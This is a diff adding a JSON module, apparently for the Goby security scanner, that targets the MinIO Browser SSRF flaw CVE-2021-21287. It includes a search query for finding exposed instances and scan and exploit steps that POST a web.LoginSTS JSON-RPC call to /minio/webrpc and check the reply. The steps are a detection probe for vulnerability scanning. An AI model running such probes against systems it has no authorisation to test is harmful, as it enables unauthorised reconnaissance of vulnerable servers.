@@ -1,0 +1,104 @@
+{
+      "Name": "MinIO Browser API SSRF CVE-2021-21287",
+      "Level": "2",
+      "Tags": [
+            "ssrf"
+      ],
+      "GobyQuery": "product=\"MINIO-Browser\" || company=\"MinIO, Inc.\" || app=\"minio-browser\" || title=\"MinIO\"",
+      "Description": "MinIO is a High Performance Object Storage released under Apache License v2.0. It is API compatible with Amazon S3 cloud storage service. Use MinIO to build high performance infrastructure for machine learning, analytics and application data workloads.",
+      "Product": "MinIO Browser",
+      "Homepage": "https://min.io/",
+      "Author": "",
+      "Impact": "MinIO is a High Performance Object Storage released under Apache License v2.0. In MinIO before version RELEASE.2021-01-30T00-20-58Z there is a server-side request forgery vulnerability. The target application may have functionality for importing data from a URL, publishing data to a URL, or otherwise reading data from a URL that can be tampered with. The attacker modifies the calls to this functionality by supplying a completely different URL or by manipulating how URLs are built (path traversal etc.). In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources. The attacker can supply or modify a URL which the code running on the server will read or submit data, and by carefully selecting the URLs, the attacker may be able to read server configuration such as AWS metadata, connect to internal services like HTTP enabled databases, or perform post requests towards internal services which are not intended to be exposed. This is fixed in version RELEASE.2021-01-30T00-20-58Z, all users are advised to upgrade. As a workaround you can disable the browser front-end with \"MINIO_BROWSER=off\" environment variable.",
+      "Recommendation": "https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q",
+      "References": [
+            "https://nvd.nist.gov/vuln/detail/CVE-2021-21287",
+            "https://github.com/minio/minio/security/advisories/GHSA-m4qq-5f7c-693q"
+      ],
+      "HasExp": true,
+      "ExpParams": null,
+      "ExpTips": {
+            "Type": "",
+            "Content": ""
+      },
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/minio/webrpc",
+                        "follow_redirect": true,
+                        "header": {
+                              "Host": "example.com",
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\":  \"Test\"},\"method\":\"web.LoginSTS\"}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "message",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+      "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/minio/webrpc",
+                        "follow_redirect": true,
+                        "header": {
+                              "Host": "example.com",
+                              "Content-Type": "application/json"
+                        },
+                        "data_type": "text",
+                        "data": "{\"id\":1,\"jsonrpc\":\"2.0\",\"params\":{\"token\":  \"Test\"},\"method\":\"web.LoginSTS\"}",
+                        "set_variable": []
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "message",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": [
+                        "output|lastbody|regex|(.*)"
+                  ]
+            }
+      ],
+      "PostTime": "0000-00-00 00:00:00",
+      "GobyVersion": "0.0.0"
+}
